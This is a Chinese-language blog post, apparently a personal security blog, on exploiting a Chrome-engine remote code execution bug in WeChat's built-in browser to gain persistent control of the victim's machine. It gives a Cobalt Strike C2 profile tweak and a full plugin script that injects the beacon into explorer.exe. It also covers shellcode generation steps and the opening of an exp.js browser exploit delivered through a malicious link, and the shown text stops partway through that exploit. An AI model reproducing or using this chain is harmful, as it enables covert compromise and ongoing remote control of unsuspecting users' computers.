<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='关于微信内置浏览器 达到持久控制 最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞
但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权
解决上述问题 1.加载自定义 malleable C2配置文件 从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程
2.加载一个 Cobalt Strike automigrate自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚
具体操作 1.加载自定义 malleable C2配置文件 1 https://github.com/threatexpress/malleable-c2 在此项目上找到你cs版本对应的配置文件，我这里用的4.0 各版本差别不大 只需要修改心跳的设置为一秒 也可以用我改好的
下载地址 ： jquery-c2.4.0.profile 修改好后丢到服务端 启动cobaltstrike时在最后面加上配置文件的名称就好 2.加载一个 Cobalt Strike automigrate自动迁移进程的插件 插件代码：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 on beacon_initial { sub callback { $regex = &amp;#39;(.*\n)&#43;explorer.exe\t\d&#43;\t(\d&#43;)(.*\n)&#43;&amp;#39;; $listener = &amp;#34;wx&amp;#34;; if ($2 ismatch $regex) { $pid = matched()[1]; $inject_pid = $pid; if (-is64 $1) { $arch = &amp;#34;x64&amp;#34;; } else { $arch = &amp;#34;x86&amp;#34;; } binject($1, $pid, $listener, $arch); } } if($inject_pid !'>
<title>关于微信内置浏览器 达到持久控制</title>

<link rel='canonical' href='https://360rce.github.io/p/whp5em3l/'>

<link rel="stylesheet" href="/scss/style.min.efe1e773d779dbe0d478a3345bc5ad949fed81363c53bfa8984135f20bf7841d.css"><meta property='og:title' content='关于微信内置浏览器 达到持久控制'>
<meta property='og:description' content='关于微信内置浏览器 达到持久控制 最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞
但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权
解决上述问题 1.加载自定义 malleable C2配置文件 从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程
2.加载一个 Cobalt Strike automigrate自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚
具体操作 1.加载自定义 malleable C2配置文件 1 https://github.com/threatexpress/malleable-c2 在此项目上找到你cs版本对应的配置文件，我这里用的4.0 各版本差别不大 只需要修改心跳的设置为一秒 也可以用我改好的
下载地址 ： jquery-c2.4.0.profile 修改好后丢到服务端 启动cobaltstrike时在最后面加上配置文件的名称就好 2.加载一个 Cobalt Strike automigrate自动迁移进程的插件 插件代码：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 on beacon_initial { sub callback { $regex = &amp;#39;(.*\n)&#43;explorer.exe\t\d&#43;\t(\d&#43;)(.*\n)&#43;&amp;#39;; $listener = &amp;#34;wx&amp;#34;; if ($2 ismatch $regex) { $pid = matched()[1]; $inject_pid = $pid; if (-is64 $1) { $arch = &amp;#34;x64&amp;#34;; } else { $arch = &amp;#34;x86&amp;#34;; } binject($1, $pid, $listener, $arch); } } if($inject_pid !'>
<meta property='og:url' content='https://360rce.github.io/p/whp5em3l/'>
<meta property='og:site_name' content='iceH&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='微信' /><meta property='article:tag' content='漏洞复现' /><meta property='article:published_time' content='2021-04-20T12:44:33&#43;00:00'/><meta property='article:modified_time' content='2021-04-20T12:44:33&#43;00:00'/><meta property='og:image' content='https://w.wallhaven.cc/full/jx/wallhaven-jxd3xw.jpg' />
<meta name="twitter:title" content="关于微信内置浏览器 达到持久控制">
<meta name="twitter:description" content="关于微信内置浏览器 达到持久控制 最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞
但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权
解决上述问题 1.加载自定义 malleable C2配置文件 从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程
2.加载一个 Cobalt Strike automigrate自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚
具体操作 1.加载自定义 malleable C2配置文件 1 https://github.com/threatexpress/malleable-c2 在此项目上找到你cs版本对应的配置文件，我这里用的4.0 各版本差别不大 只需要修改心跳的设置为一秒 也可以用我改好的
下载地址 ： jquery-c2.4.0.profile 修改好后丢到服务端 启动cobaltstrike时在最后面加上配置文件的名称就好 2.加载一个 Cobalt Strike automigrate自动迁移进程的插件 插件代码：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 on beacon_initial { sub callback { $regex = &amp;#39;(.*\n)&#43;explorer.exe\t\d&#43;\t(\d&#43;)(.*\n)&#43;&amp;#39;; $listener = &amp;#34;wx&amp;#34;; if ($2 ismatch $regex) { $pid = matched()[1]; $inject_pid = $pid; if (-is64 $1) { $arch = &amp;#34;x64&amp;#34;; } else { $arch = &amp;#34;x86&amp;#34;; } binject($1, $pid, $listener, $arch); } } if($inject_pid !"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://w.wallhaven.cc/full/jx/wallhaven-jxd3xw.jpg' />
    <link rel="shortcut icon" href="/favicon.ico" />
<style>
    :root {
     
    --sys-font-family: "HarmonyOS_Sans_SC_Medium", Georgia, -apple-system, 'Nimbus Roman No9 L', 'PingFang SC', 'Hiragino Sans GB', 'Noto Serif SC', 'Microsoft Yahei', 'WenQuanYi Micro Hei', 'ST Heiti', sans-serif;
    --code-font-family: "JetBrainsMono Regular", Menlo, Monaco, Consolas, "Courier New";
    --article-font-family: "HarmonyOS_Sans_SC_Medium", var(--base-font-family);
  }
</style>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://npm.elemecdn.com/irithys-cdn@1.0.4/font/font.css";
        customFont.type = "text/css";
        customFont.rel = "stylesheet";
         document.head.appendChild(customFont);
}());
</script>
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended">


        <div id="article-toolbar" style="position: sticky;top: 5px;z-index: 1000;">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>返回</span>
            </a>
        </div>
    

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256zM176 168V344C176 352.7 180.7 360.7 188.3 364.9C195.8 369.2 205.1 369 212.5 364.5L356.5 276.5C363.6 272.1 368 264.4 368 256C368 247.6 363.6 239.9 356.5 235.5L212.5 147.5C205.1 142.1 195.8 142.8 188.3 147.1C180.7 151.3 176 159.3 176 168V168z"></path></svg>
            
        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#关于微信内置浏览器-达到持久控制">关于微信内置浏览器 达到持久控制</a></li>
    <li><a href="#解决上述问题">解决上述问题</a></li>
    <li><a href="#具体操作">具体操作</a>
      <ol>
        <li><a href="#1加载自定义-malleable-c2配置文件">1.加载自定义 malleable C2配置文件</a>
          <ol>
            <li><a href="#在此项目上找到你cs版本对应的配置文件我这里用的40-各版本差别不大">在此项目上找到你cs版本对应的配置文件，我这里用的4.0 各版本差别不大</a></li>
            <li><a href="#修改好后丢到服务端">修改好后丢到服务端</a></li>
          </ol>
        </li>
        <li><a href="#2加载一个-cobalt-strike-automigrate自动迁移进程的插件">2.加载一个 Cobalt Strike automigrate自动迁移进程的插件</a>
          <ol>
            <li><a href="#复制到本地保存成一个cna文件使用cobaltstrike加载插件就可">复制到本地保存成一个.cna文件使用cobaltstrike加载插件就可</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#测试">测试：</a>
      <ol>
        <li><a href="#1准备文件">1.准备文件</a>
          <ol>
            <li><a href="#新建一个监听器">新建一个监听器</a></li>
            <li><a href="#生成一个shellcode">生成一个shellcode</a></li>
            <li><a href="#替换js代码里的shellcode">替换js代码里的shellcode</a></li>
            <li><a href="#创建一个html文件调用js">创建一个html文件调用js</a></li>
          </ol>
        </li>
        <li><a href="#2搭建服务">2.搭建服务</a>
          <ol>
            <li><a href="#随便拿什么搭都可以-我直接用phpstudy搭建下">随便拿什么搭都可以 我直接用phpstudy搭建下</a></li>
          </ol>
        </li>
        <li><a href="#测试上线与进程转移效果">测试上线与进程转移效果</a></li>
        <li><a href="#而转移到explorerexe的会话依然坚挺">而转移到explorer.exe的会话依然坚挺！</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/whp5em3l/">
                
                    <img src="https://w.wallhaven.cc/full/jx/wallhaven-jxd3xw.jpg" loading="lazy" alt="Featured image of post 关于微信内置浏览器 达到持久控制" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%90%B9%E6%A2%A6%E5%88%B0%E8%A5%BF%E5%B7%9E/" >
                吹梦到西州
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/whp5em3l/">关于微信内置浏览器 达到持久控制</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M326.1 160l127.4-127.4C451.7 32.39 449.9 32 448 32h-86.06l-128 128H326.1zM166.1 160l128-128H201.9l-128 128H166.1zM497.7 56.19L393.9 160H512V96C512 80.87 506.5 67.15 497.7 56.19zM134.1 32H64C28.65 32 0 60.65 0 96v64h6.062L134.1 32zM0 416c0 35.35 28.65 64 64 64h384c35.35 0 64-28.65 64-64V192H0V416z"></path></svg>
                
                <time class="article-time--published">2021/04/20</time>
            </div>
        

        
            <div>
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 512C114.6 512 0 397.4 0 256S114.6 0 256 0S512 114.6 512 256s-114.6 256-256 256zM232 120V256c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2V120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"></path></svg>
                
                <time class="article-time--reading">
                    阅读时长: 4 分钟
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="关于微信内置浏览器-达到持久控制">关于微信内置浏览器 达到持久控制</h2>
<p>最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞</p>
<p>但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权</p>
<h2 id="解决上述问题">解决上述问题</h2>
<p>1.加载自定义 malleable C2配置文件 从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程</p>
<p>2.加载一个 Cobalt Strike automigrate自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚</p>
<h2 id="具体操作">具体操作</h2>
<h3 id="1加载自定义-malleable-c2配置文件">1.加载自定义 malleable C2配置文件</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/threatexpress/malleable-c2
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="在此项目上找到你cs版本对应的配置文件我这里用的40-各版本差别不大">在此项目上找到你cs版本对应的配置文件，我这里用的4.0 各版本差别不大</h4>
<p>只需要修改心跳的设置为一秒
也可以用我改好的</p>
<h5 id="下载地址--jquery-c240profilejquery-c240profile">下载地址 ： <a class="link" href="jquery-c2.4.0.profile" >jquery-c2.4.0.profile</a></h5>
<h4 id="修改好后丢到服务端">修改好后丢到服务端</h4>
<p>启动cobaltstrike时在最后面加上配置文件的名称就好
<img src="/p/whp5em3l/01.jpg"
	width="1111"
	height="67"
	srcset="/p/whp5em3l/01_hu8a354fc426ae4419a388c011afb60bc7_11371_480x0_resize_q75_box.jpg 480w, /p/whp5em3l/01_hu8a354fc426ae4419a388c011afb60bc7_11371_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="开启服务"
	
	
		class="gallery-image" 
		data-flex-grow="1658"
		data-flex-basis="3979px"
	
></p>
<h3 id="2加载一个-cobalt-strike-automigrate自动迁移进程的插件">2.加载一个 Cobalt Strike automigrate自动迁移进程的插件</h3>
<p>插件代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">on beacon_initial
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl"> sub callback
</span></span><span class="line"><span class="cl"> {
</span></span><span class="line"><span class="cl">  $regex = &#39;(.*\n)+explorer.exe\t\d+\t(\d+)(.*\n)+&#39;;
</span></span><span class="line"><span class="cl">  $listener = &#34;wx&#34;;
</span></span><span class="line"><span class="cl">  if ($2  ismatch $regex)
</span></span><span class="line"><span class="cl">  {
</span></span><span class="line"><span class="cl">   $pid = matched()[1];
</span></span><span class="line"><span class="cl">   $inject_pid = $pid;
</span></span><span class="line"><span class="cl">   if (-is64 $1)
</span></span><span class="line"><span class="cl">   {
</span></span><span class="line"><span class="cl">    $arch = &#34;x64&#34;;
</span></span><span class="line"><span class="cl">   }
</span></span><span class="line"><span class="cl">   else
</span></span><span class="line"><span class="cl">   {
</span></span><span class="line"><span class="cl">    $arch = &#34;x86&#34;;
</span></span><span class="line"><span class="cl">   }
</span></span><span class="line"><span class="cl">   binject($1, $pid, $listener, $arch);
</span></span><span class="line"><span class="cl">  }
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> if($inject_pid != beacon_info($1,&#34;pid&#34;))
</span></span><span class="line"><span class="cl"> {
</span></span><span class="line"><span class="cl">  bps($1, &amp;callback);
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="复制到本地保存成一个cna文件使用cobaltstrike加载插件就可">复制到本地保存成一个.cna文件使用cobaltstrike加载插件就可</h4>
<p><img src="/p/whp5em3l/02.jpg"
	width="1003"
	height="161"
	srcset="/p/whp5em3l/02_hu229221e1d22f4e4b2fd8c65062b45686_16287_480x0_resize_q75_box.jpg 480w, /p/whp5em3l/02_hu229221e1d22f4e4b2fd8c65062b45686_16287_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="加载插件"
	
	
		class="gallery-image" 
		data-flex-grow="622"
		data-flex-basis="1495px"
	
></p>
<h2 id="测试">测试：</h2>
<h3 id="1准备文件">1.准备文件</h3>
<h4 id="新建一个监听器">新建一个监听器</h4>
<p><code>监听器名字一定要设置成wx，不然无法自动迁移进程</code></p>
<p><img src="/p/whp5em3l/03.jpg"
	width="463"
	height="546"
	srcset="/p/whp5em3l/03_hubd1867c2cc4b59e42b457e78a10a0217_23360_480x0_resize_q75_box.jpg 480w, /p/whp5em3l/03_hubd1867c2cc4b59e42b457e78a10a0217_23360_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="新建监听"
	
	
		class="gallery-image" 
		data-flex-grow="84"
		data-flex-basis="203px"
	
></p>
<h4 id="生成一个shellcode">生成一个shellcode</h4>
<p><img src="/p/whp5em3l/04.jpg"
	width="354"
	height="229"
	srcset="/p/whp5em3l/04_hud4ea8e83a98ee69a1195642ace45f976_11309_480x0_resize_q75_box.jpg 480w, /p/whp5em3l/04_hud4ea8e83a98ee69a1195642ace45f976_11309_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="生成shellcode"
	
	
		class="gallery-image" 
		data-flex-grow="154"
		data-flex-basis="371px"
	
></p>
<p>这里的就是你的shellcode，将所有<code>\</code>替换成<code>,0</code></p>
<p><img src="/p/whp5em3l/05.jpg"
	width="1720"
	height="589"
	srcset="/p/whp5em3l/05_huc934aeca7029b8e3dbf27850a5d54a01_142091_480x0_resize_q75_box.jpg 480w, /p/whp5em3l/05_huc934aeca7029b8e3dbf27850a5d54a01_142091_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="生成shellcode"
	
	
		class="gallery-image" 
		data-flex-grow="292"
		data-flex-basis="700px"
	
></p>
<h4 id="替换js代码里的shellcode">替换js代码里的shellcode</h4>
<p>exp.js代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">ENABLE_LOG</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">IN_WORKER</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// run calc and hang in a loop
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="p">[</span><span class="nx">shellcode</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="c1">//&#34;shellcode&#34;处放我们的shellcode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">print</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">not_optimised_out</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">target_function</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">value</span> <span class="o">==</span> <span class="mh">0xdecaf0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">not_optimised_out</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">not_optimised_out</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">not_optimised_out</span> <span class="o">|=</span> <span class="mh">0xff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">not_optimised_out</span> <span class="o">*=</span> <span class="mi">12</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">target_function</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">g_array</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">tDerivedNCount</span> <span class="o">=</span> <span class="mi">17</span> <span class="o">*</span> <span class="mi">87481</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">tDerivedNDepth</span> <span class="o">=</span> <span class="mi">19</span> <span class="o">*</span> <span class="mi">19</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">cb</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">flag</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">g_array</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">g_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1dbabe</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;c01db33f&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">gc</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">new</span> <span class="nb">String</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">oobAccess</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">this_</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">buffer</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">buffer_view</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">page_buffer</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">page_view</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
